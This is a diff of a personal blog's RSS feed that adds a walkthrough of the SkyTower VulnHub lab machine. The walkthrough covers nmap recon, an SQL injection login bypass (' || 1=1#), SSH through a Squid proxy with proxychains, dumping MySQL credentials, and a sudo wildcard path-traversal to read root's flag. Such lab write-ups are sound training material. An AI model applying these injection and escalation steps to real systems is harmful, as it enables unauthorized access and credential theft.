@@ -1,21 +1,109 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Posts on Abhi Venkatesh</title>
+        <title>Posts on defstryker | home</title>
         <link>https://defstryker.dev/posts/</link>
-        <description>Recent content in Posts on Abhi Venkatesh</description>
+        <description>Recent content in Posts on defstryker | home</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 15 Nov 2020 20:38:35 +0530</lastBuildDate>
+        <lastBuildDate>Mon, 16 Nov 2020 19:51:16 +0530</lastBuildDate>
         <atom:link href="https://defstryker.dev/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>Swagshop</title>
-            <link>https://defstryker.dev/posts/202011/swagshop/</link>
-            <pubDate>Sun, 15 Nov 2020 20:38:35 +0530</pubDate>
+            <title>Skytower</title>
+            <link>https://defstryker.dev/posts/202011/skytower/</link>
+            <pubDate>Mon, 16 Nov 2020 19:51:16 +0530</pubDate>
             
-            <guid>https://defstryker.dev/posts/202011/swagshop/</guid>
-            <description>Mikkou</description>
-            <content type="html"><![CDATA[<p>Mikkou</p>
+            <guid>https://defstryker.dev/posts/202011/skytower/</guid>
+            <description>We first get the IP address of the vulnhub box by running an ARP scan.
+sudo arp-scan -l We find that the IP in this case is 192.168.1.65.
+Recon From there we run an nmap SYN scan:
+sudo nmap -sS -sC -sV -O -vvvv 192.168.1.65 -oA nmap/skytower  -sS -&amp;gt; SYN Scan
+-sC -&amp;gt; run default scripts
+-sV -&amp;gt; run version scan on services found
+-O -&amp;gt; try to detect OS</description>
+            <content type="html"><![CDATA[<p>We first get the IP address of the vulnhub box by running an ARP scan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo arp-scan -l
+</code></pre></div><p>We find that the IP in this case is <code>192.168.1.65</code>.</p>
+<h2 id="recon">Recon</h2>
+<p>From there we run an nmap SYN scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sC -sV -O -vvvv 192.168.1.65 -oA nmap/skytower
+</code></pre></div><blockquote>
+<p>-sS 	-&gt; SYN Scan</p>
+<p>-sC 	-&gt; run default scripts</p>
+<p>-sV 	-&gt; run version scan on services found</p>
+<p>-O  	-&gt; try to detect OS</p>
+<p>-vvvv -&gt; set verbose level 4; show results as they are found without waiting</p>
+<p>-oA 	-&gt; output all formats to given folder</p>
+</blockquote>
+<p>We find 3 ports:</p>
+<p><img src="/img/skytower/nmap-ports.png" alt="nmap ports" title="nmap ports"></p>
+<p>Since the SSH port is filtered and port 3128 is Squid HTTP Proxy, let us return to them later.</p>
+<p>On heading to http://192.168.1.65 we are greeted with a login page. Simple testing shows that the password field is SQL injectable, but it filters out the <code>OR</code> from our SQL injection. Instead we use the or operator <code>||</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; || 1=1#
+</span></code></pre></div><p>in the password field to bypass the login.</p>
+<p>We are greeted with a page with SSH creds, but recall we noted that the SSH port is filtered.</p>
+<p><img src="/img/skytower/john-ssh.png" alt="SSH creds" title="SSH creds"></p>
+<h2 id="foothold">Foothold</h2>
+<p>Here we use <code>proxychains</code> to connect to the HTTP proxy and access the SSH port. First to configure <code>proxychains</code>:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo echo <span style="color:#e6db74">&#39;http 192.168.1.65 3128&#39;</span> &gt;&gt; /etc/proxychains.conf
+proxychains 192.168.1.65 ssh john@192.168.1.65
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>I had some issues related to static chains so I switched from static chains to dynamic in the same conf file, then I could access the SSH port.</p>
+</blockquote>
+<p>Once we enter the password, we are printed something and immediately kicked off the connection. To persist, we can do the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">proxychains 192.168.1.65 ssh john@192.168.1.65 bash
+</code></pre></div><p>and now we have a working shell.</p>
+<h2 id="privesc">PrivEsc</h2>
+<p>Now that we are inside, we poke around trying to find anything interesting. Recall that there was a login page tied to a MySQL backend? Meaning there is MySQL credentials which we can use. So we go to the webroot directory and looking through the code we find MySQL creds.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /var/www
+cat login.php
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/skytower/webroot.png" alt="MySQL Creds"></p>
+<p>We can use the <code>mysql</code> client to extract information from the database using the following two commands:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -u root -p -e <span style="color:#e6db74">&#34;show tables;&#34;</span> SkyTech
+mysql -u root -p -e <span style="color:#e6db74">&#34;select * from login;&#34;</span> SkyTech
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/skytower/tables.png" alt="tables">
+<img src="/img/skytower/login-table.png" alt="login-table"></p>
+<p>They seem to be SSH credentials for 2 other users, on trying both of them only with <code>sara</code> we can login. As <code>sara</code> we run</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -l
+</code></pre></div><p>to check if <code>sara</code> has permissions to run any commands as the superuser.</p>
+<p><img src="/img/skytower/sudo-l.png" alt="sudo -l"></p>
+<p>We see that we can <code>cat</code> and <code>ls</code> as the superuser for <code>/accounts/*</code>. We can abuse the open path thanks to the <code>*</code> by doing something like:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /bin/ls /accounts/../../root
+sudo /bin/cat /accounts/../../root/flag.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/skytower/final.png" alt="flag.txt"></p>
+<p>Using that we can SSH in as root.</p>
 ]]></content>
         </item>
         
